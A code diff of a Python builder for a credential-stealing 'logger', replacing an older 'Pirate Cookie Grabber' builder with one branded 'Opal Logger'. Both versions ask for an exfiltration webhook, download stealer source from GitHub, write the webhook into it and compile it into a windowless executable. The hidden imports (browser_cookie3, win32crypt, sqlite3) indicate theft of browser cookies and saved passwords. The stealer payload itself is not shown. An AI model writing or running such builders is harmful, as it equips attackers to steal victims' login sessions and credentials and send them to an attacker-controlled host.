@@ -1,45 +1,41 @@
-import os
-import shutil
+import marshal
+import zlib
 import requests
-import PyInstaller.__main__
-
-def endHandler():
-  os._exit(0)
-
-        
-print(''' 
-Made By Synthetic#2958
-''')
-webhookk = input(f"Input Webhook: ")
-
-fileName = input(f"Input File Name: ")
-
-code = requests.get("https://raw.githubusercontent.com/Mani175/Pirate-Cookie-Grabber/main/PirateStealer.py").text.replace("heh", webhookk)
-with open(f"{fileName}.py", 'w') as f:
-    f.write(code)
-
-print(f"\nCreating {fileName}.exe\n")
-os.system(f'title Creating {fileName}.exe')
-    #the equivalent to "pyarmor pack -e "--onefile --noconsole  " {fileName}.exe"
-PyInstaller.__main__.run([
-        '%s.py' % fileName,
-        '--name=%s' % fileName,
-        '--onefile',
-        '--noconsole',
-        '--log-level=INFO',
-        '--icon=NONE',
-    ])
-try:
-        #clean build files
-        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
-        shutil.rmtree('build')
-        shutil.rmtree('dist')
-        shutil.rmtree('__pycache__')
-        os.remove(f'{fileName}.spec')
-        os.remove(f'{fileName}.py')
-except FileNotFoundError:
-        pass
-
-print(f"\nFile created as {fileName}.exe\n")
-input(f'Enter anything to continue . . .  ')
-endHandler()
+from pystyle import *
+import os
+import time
+import shutil
+os.system(f'cls & title Opal Logger Builder!')
+Write.Print(Center.XCenter("""
+                                         ╔═╗┌─┐┌─┐┬    ╦  ┌─┐┌─┐┌─┐┌─┐┬─┐
+                                         ║ ║├─┘├─┤│    ║  │ ││ ┬│ ┬├┤ ├┬┘
+                                         ╚═╝┴  ┴ ┴┴─┘  ╩═╝└─┘└─┘└─┘└─┘┴└─             
+                                    Builder by Jose | Opal Logger by synthetic                                                                                  
+\n"""), Colors.green_to_blue, interval=0)
+webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_blue, interval=0.01)
+r = requests.get(webhook)
+if r.status_code == 200:
+         Write.Print("Webhook Is Working\n",Colors.green_to_blue, interval=0.01) 
+         time.sleep(1) 
+else: 
+    Write.Print("Webhook Is Not Working\n",Colors.green_to_blue, interval=0.01) 
+    time.sleep(3) 
+    exit()
+name = Write.Input("Enter File Name:", Colors.green_to_blue, interval=0.01)
+code = requests.get("https://raw.githubusercontent.com/Syntheticc/Opal-Logger/main/Opal.py")
+with open(f"{name}.py", 'w', encoding='utf8') as f:
+    f.write(code.text.replace("webhooker", webhook))
+Write.Print("Opal Logger Was SucessFully Built\n",Colors.green_to_blue, interval=0.01)
+compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
+if compile == "y":
+   os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="discord" --hidden-import="browser_cookie3" --hidden-import="shutil" --hidden-import="base64" --hidden-import="win32crypt" --hidden-import="shutil" --hidden-import="sqlite3" --hidden-import="psutil" --hidden-import="colorama" {name}.py')
+   os.remove(f'{name}.spec')
+   Write.Print("Opal Logger Was SucessFully Complied In Dist Folder\n",Colors.green_to_blue, interval=0.01) 
+   time.sleep(2)
+   Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Opal Logger\n",Colors.green_to_blue, interval=0.01) 
+   time.sleep(3)
+   exit()
+elif compile == "n":
+   Write.Print("Thank You For Using Opal Logger\n",Colors.green_to_blue, interval=0.01) 
+   time.sleep(3)
+   exit()
